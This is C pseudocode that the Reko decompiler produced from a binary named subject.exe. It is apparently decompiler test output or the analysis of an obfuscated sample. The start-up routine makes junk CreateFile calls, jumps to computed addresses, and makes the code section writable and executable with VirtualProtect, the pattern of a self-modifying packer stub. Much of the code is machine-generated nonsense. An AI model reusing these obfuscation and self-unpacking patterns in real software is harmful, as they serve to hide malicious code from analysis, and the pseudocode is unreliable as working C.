// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401026: void fn00401026(Register Eq_2 eax, Register word32 ecx, Register cu8 dl, Register word32 ebx, Register (ptr Eq_6) ebp, Register (ptr byte) esi, Register Eq_8 edi)
void fn00401026(Eq_2 eax, word32 ecx, cu8 dl, word32 ebx, Eq_6 * ebp, byte * esi, Eq_8 edi)
{
	(union Eq_2 *) 494971428 = (union Eq_2 *) eax;
	word16 ax_37 = (word16) __indw(133);
	byte v5_9 = (byte *) 494971643 - 229 - C;
	(byte *) 494971643 = (byte *) v5_9;
	word32 * esp_1 = fp;
	Eq_28 C_12 = cond(v5_9);
	do
	{
		esp_1 = esp_1 - 0x02;
		*esp_1 = (word32) cs;
		int32 eax_41 = (int32) ax_37 - 501320805 - C_12;
		esi = esi + 0x01;
		word16 ax_157 = (word16) (eax_41 & 621039422);
		byte al_158 = (byte) (eax_41 & 621039422);
		if (true)
		{
			*((word32) edi - 1800889568) = *((word32) edi - 1800889568) ^ esi;
			word32 ebx_122 = ebx - 0x01;
			do
			{
				up32 edi_132 = ebp->dw001C;
				P.u1 = *esp_1;
				esp_1 = esp_1 + 0x01;
				edi = (union Eq_8 *) 858037981;
			} while ((word32) edi - 1800889568);
			up32 eax_151 = edi_132 - 882428795 - (edi_132 < 0x809F2612);
			word32 eax_156 = eax_151 - 0x3C18C87B - (eax_151 < 0x809B260E);
			ebx = ebx_122 + 0x02;
			bh = SLICE(ebx_122 + 0x02, byte, 8);
			bl = (byte) (ebx_122 + 0x02);
			dl = 0x3D;
			ax_157 = (word16) eax_156;
			al_158 = (byte) eax_156;
		}
		ci8 al_67 = al_158 - ~0x0A - (dl < gs->*((word32) edi + 0x0132F01E));
		ax_37 = DPB(ax_157, al_67, 0);
		C_12 = cond(al_67);
		dl = 0x99;
	} while (al_67 > 0x00);
	*edi = al_67 + 0x18;
	Eq_116 edi_83 = (word32) edi + 0x01;
	*edi_83 = (word32) *edi_83 + bh;
	struct Eq_16 * eax_86 = __indw(~0x34);
	word16 ax_93 = (word16) (ebp - 2919180669);
	if (P)
	{
		ci8 v32_113 = *(ebp - 2919180629) - bl;
		*(ebp - 2919180629) = v32_113;
		if (v32_113 <= 0x00)
			;
	}
	else
	{
		struct Eq_16 * eax_100 = __indw(0xB4);
		byte al_102 = *esi;
		eax_86->b24EDE9F5 = eax_86->b24EDE9F5 - 181;
		(word32 *) 3064341117 = (word32 *) DPB(eax_100, al_102, 0);
		__aad(DPB(ax_93, al_102, 0));
	}
}

// 00410473: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	GetLastError();
	GetCommandLineA();
	GetModuleHandleA(&globals->t4357BF);
	CreateFileW(&globals->t43585B, 0x00, 0x00, null, 0x03, 0x0107, 0x00);
	CreateFileA(&globals->t4358B8, 0x00, 0x02, null, 0x03, 0x00, 0x00);
	ptr32 esp_108 = fp + ~0xA3;
	do
	{
		struct Eq_222 * esp_56 = esp_108 - 0x04;
		esp_56->t0000.u0 = 0x03;
		*(esp_56 - 0x04) = 0x00;
		*(esp_56 - 0x08) = 0x04;
		*(esp_56 - 0x0C) = 0x40000000;
		*(esp_56 - 0x10) = 4413406;
		CreateFileA(*(esp_56 - 0x10), *(esp_56 - 0x0C), *(esp_56 - 0x08), *(esp_56 - 0x04), esp_56->t0000, esp_56->t0004, esp_56->t0008);
		Eq_283 eax_68 = GetProcAddress(*(esp_56 - 0x10), *(esp_56 - 0x0C));
		GetLastError();
		*(esp_56 - 0x14) = 0x00;
		GetCommandLineA();
		*(esp_56 - 0x18) = 0x00;
		GetLastError();
		*(esp_56 - 0x1C) = 0x00;
		GetLastError();
		Eq_324 eax_83 = eax_68();
		GetLastError();
		*(esp_56 - 0x20) = 0x00;
		*(esp_56 - 0x24) = 0x0125;
		*(esp_56 - 0x28) = 0x03;
		*(esp_56 - 44) = 0x00;
		*(esp_56 - 0x30) = 0x07;
		*(esp_56 - 0x34) = 0x60000000;
		*(esp_56 - 0x38) = 4413473;
		esp_108 = esp_56 - 0x38;
	} while (CreateFileW(*(esp_56 - 0x38), *(esp_56 - 0x34), *(esp_56 - 0x30), *(esp_56 - 44), *(esp_56 - 0x28), *(esp_56 - 0x24), *(esp_56 - 0x20)) != ~0x00);
	*(esp_56 - 0x3C) = 0x00;
	*(esp_56 - 0x40) = 0x0181;
	*(esp_56 - 0x44) = 0x03;
	*(esp_56 - 0x48) = 0x00;
	*(esp_56 - 0x4C) = 0x02;
	*(esp_56 - 0x50) = 0x20000000;
	*(esp_56 - 0x54) = 4413581;
	CreateFileW(*(esp_56 - 0x54), *(esp_56 - 0x50), *(esp_56 - 0x4C), *(esp_56 - 0x48), *(esp_56 - 0x44), *(esp_56 - 0x40), *(esp_56 - 0x3C));
	*(esp_56 - 88) = 0x00;
	*(esp_56 - 0x5C) = 0x05;
	*(esp_56 - 0x60) = 0x03;
	*(esp_56 - 100) = 0x00;
	*(esp_56 - 0x68) = 0x01;
	*(esp_56 - 0x6C) = 0x00;
	*(esp_56 - 0x70) = 4413556;
	CreateFileW(*(esp_56 - 0x70), *(esp_56 - 0x6C), *(esp_56 - 0x68), *(esp_56 - 100), *(esp_56 - 0x60), *(esp_56 - 0x5C), *(esp_56 - 88));
	*(esp_56 - 116) = 0x00;
	*(esp_56 - 0x78) = 0xA4;
	*(esp_56 - 0x7C) = 0x03;
	*(esp_56 - 0x80) = 0x00;
	*(esp_56 - 0x84) = 0x07;
	*(esp_56 - 0x88) = 0x60000000;
	*(esp_56 - 0x8C) = 4413604;
	CreateFileW(*(esp_56 - 0x8C), *(esp_56 - 0x88), *(esp_56 - 0x84), *(esp_56 - 0x80), *(esp_56 - 0x7C), *(esp_56 - 0x78), *(esp_56 - 116));
	*(esp_56 - 0x90) = 0x00;
	*(esp_56 - 0x94) = 388;
	*(esp_56 - 0x98) = 0x03;
	*(esp_56 - 0x9C) = 0x00;
	*(esp_56 - 0xA0) = 0x02;
	*(esp_56 - 0xA4) = 0x80000000;
	*(esp_56 - 0xA8) = 4413339;
	Eq_2 eax_182 = CreateFileA(*(esp_56 - 0xA8), *(esp_56 - 0xA4), *(esp_56 - 0xA0), *(esp_56 - 0x9C), *(esp_56 - 0x98), *(esp_56 - 0x94), *(esp_56 - 0x90));
	ptr32 esp_184;
	word32 ebp_185;
	byte SCZO_186;
	word32 eax_187;
	byte Z_188;
	byte SZO_189;
	byte C_190;
	word32 ecx_191;
	byte dl_192;
	word32 ebx_193;
	word32 esi_194;
	word32 edi_195;
	(*((word32) (eax_83 ^ 0xC0000005) + 0x0041066D))();
	*(esp_184 - 0x04) = 0x00;
	*(esp_184 - 0x08) = 0x84;
	*(esp_184 - 0x0C) = 0x03;
	*(esp_184 - 0x10) = 0x00;
	*(esp_184 - 0x14) = 0x01;
	*(esp_184 - 0x18) = 0x60000000;
	*(esp_184 - 0x1C) = 4413517;
	CreateFileW(*(esp_184 - 0x1C), *(esp_184 - 0x18), *(esp_184 - 0x14), *(esp_184 - 0x10), *(esp_184 - 0x0C), *(esp_184 - 0x08), *(esp_184 - 0x04));
	ptr32 esp_208 = esp_184 - 0x1C;
	do
	{
		GetLastError();
		union Eq_2 * esp_214 = esp_208 - 0x04;
		*esp_214 = 0x00;
		*(esp_214 - 0x04) = 0x01A7;
		*(esp_214 - 0x08) = 0x03;
		*(esp_214 - 0x0C) = 0x00;
		*(esp_214 - 0x10) = 0x00;
		*(esp_214 - 0x14) = 0x60000000;
		*(esp_214 - 0x18) = 4413536;
		esp_208 = esp_214 - 0x18;
	} while (CreateFileW(*(esp_214 - 0x18), *(esp_214 - 0x14), *(esp_214 - 0x10), *(esp_214 - 0x0C), *(esp_214 - 0x08), *(esp_214 - 0x04), *esp_214) != ~0x00);
	*(esp_214 - 0x1C) = fp - 0x4C;
	GetLastError();
	*(esp_214 - 0x20) = 0x00;
	*(esp_214 - 0x24) = 0x27;
	*(esp_214 - 0x28) = 0x03;
	*(esp_214 - 44) = 0x00;
	*(esp_214 - 0x30) = 0x05;
	*(esp_214 - 0x34) = 0xA0000000;
	*(esp_214 - 0x38) = 4413636;
	CreateFileA(*(esp_214 - 0x38), *(esp_214 - 0x34), *(esp_214 - 0x30), *(esp_214 - 44), *(esp_214 - 0x28), *(esp_214 - 0x24), *(esp_214 - 0x20));
	*(esp_214 - 0x3C) = 0x40;
	GetLastError();
	*(esp_214 - 0x40) = 61806;
	*(esp_214 - 0x44) = 0x00401000;
	VirtualProtect(*(esp_214 - 0x44), *(esp_214 - 0x40), *(esp_214 - 0x3C), *(esp_214 - 0x38));
	*(esp_214 - 0x48) = 0x00;
	*(esp_214 - 0x4C) = 0x0127;
	*(esp_214 - 0x50) = 0x03;
	*(esp_214 - 0x54) = 0x00;
	*(esp_214 - 88) = 0x03;
	*(esp_214 - 0x5C) = 0x20000000;
	*(esp_214 - 0x60) = 4413385;
	CreateFileA(*(esp_214 - 0x60), *(esp_214 - 0x5C), *(esp_214 - 88), *(esp_214 - 0x54), *(esp_214 - 0x50), *(esp_214 - 0x4C), *(esp_214 - 0x48));
	GetLastError();
	*(esp_214 - 100) = (union Eq_324 *) eax_83;
	GetCommandLineA();
	*(esp_214 - 0x68) = 61806;
	GetLastError();
	GetCommandLineA();
	*(esp_214 - 0x6C) = 0x00401000;
	*(esp_214 - 0x70) = 0x00;
	*(esp_214 - 116) = 0x01A7;
	*(esp_214 - 0x78) = 0x03;
	*(esp_214 - 0x7C) = 0x00;
	*(esp_214 - 0x80) = 0x03;
	*(esp_214 - 0x84) = 0xA0000000;
	*(esp_214 - 0x88) = 4413497;
	CreateFileA(*(esp_214 - 0x88), *(esp_214 - 0x84), *(esp_214 - 0x80), *(esp_214 - 0x7C), *(esp_214 - 0x78), *(esp_214 - 116), *(esp_214 - 0x70));
	*(esp_214 - 0x8C) = 0x00;
	*(esp_214 - 0x90) = 422;
	*(esp_214 - 0x94) = 0x03;
	*(esp_214 - 0x98) = 0x00;
	*(esp_214 - 0x9C) = 0x01;
	*(esp_214 - 0xA0) = 0xA0000000;
	*(esp_214 - 0xA4) = 0x00435881;
	CreateFileA(*(esp_214 - 0xA4), *(esp_214 - 0xA0), *(esp_214 - 0x9C), *(esp_214 - 0x98), *(esp_214 - 0x94), *(esp_214 - 0x90), *(esp_214 - 0x8C));
	GetLastError();
	*(esp_214 - 0xA8) = 0x00;
	*(esp_214 - 0xAC) = 0x0107;
	*(esp_214 - 0xB0) = 0x03;
	*(esp_214 - 0xB4) = 0x00;
	*(esp_214 - 0xB8) = 0x05;
	*(esp_214 - 188) = 0x20000000;
	*(esp_214 - 0xC0) = 4413358;
	Eq_2 eax_338 = CreateFileW(*(esp_214 - 0xC0), *(esp_214 - 188), *(esp_214 - 0xB8), *(esp_214 - 0xB4), *(esp_214 - 0xB0), *(esp_214 - 0xAC), *(esp_214 - 0xA8));
	ptr32 esp_343;
	struct Eq_6 * ebp_344;
	byte SCZO_345;
	word32 eax_346;
	byte Z_347;
	byte SZO_348;
	byte C_349;
	word32 ecx_350;
	cu8 dl_351;
	word32 ebx_352;
	byte * esi_353;
	Eq_8 edi_354;
	(eax_83 - ~0x4041042F)();
	GetCommandLineA();
	*(esp_343 - 0x04) = 0x00;
	*(esp_343 - 0x08) = 0x0187;
	*(esp_343 - 0x0C) = 0x03;
	*(esp_343 - 0x10) = 0x00;
	*(esp_343 - 0x14) = 0x00;
	*(esp_343 - 0x18) = 0x80000000;
	*(esp_343 - 0x1C) = 4413449;
	Eq_2 eax_370 = CreateFileA(*(esp_343 - 0x1C), *(esp_343 - 0x18), *(esp_343 - 0x14), *(esp_343 - 0x10), *(esp_343 - 0x0C), *(esp_343 - 0x08), *(esp_343 - 0x04));
	fn00401026(eax_370, ecx_350, dl_351, ebx_352, ebp_344, esi_353, edi_354);
	return eax_370;
}

